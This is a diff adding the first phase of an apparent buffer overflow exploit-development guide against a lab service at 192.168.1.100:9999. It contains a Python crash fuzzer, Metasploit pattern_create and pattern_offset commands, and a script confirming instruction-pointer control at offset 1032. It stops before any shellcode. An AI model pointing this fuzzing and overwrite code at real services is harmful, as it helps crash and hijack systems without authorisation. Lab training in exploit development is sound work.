@@ -1,0 +1,31 @@
+**Phase 1: Vulnerability Analysis & Crash Reproduction**
+- **Fuzzing to Find Offset**:
+  ```python
+  # fuzz.py
+  import socket, sys
+  buffer = b"A" * 100
+  while True:
+      try:
+          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+          s.connect(("192.168.1.100", 9999))
+          s.send(b"VULN " + buffer + b"\r\n")
+          s.close()
+          buffer += b"A" * 100
+      except:
+          print(f"Crash at {len(buffer)} bytes")
+          sys.exit()
+  ```
+- **Precise Offset with Pattern**:
+  ```bash
+  # Generate pattern
+  msf-pattern_create -l 2000
+  # Send pattern, crash, note RIP value
+  msf-pattern_offset -q 0x4133634132634131
+  ```
+- **Confirm Control**:
+  ```python
+  # verify_offset.py
+  offset = 1032  # from pattern_offset
+  payload = b"A" * offset + b"BBBBBBBB" + b"C" * 200
+  # RIP should be 0x4242424242424242
+  ```
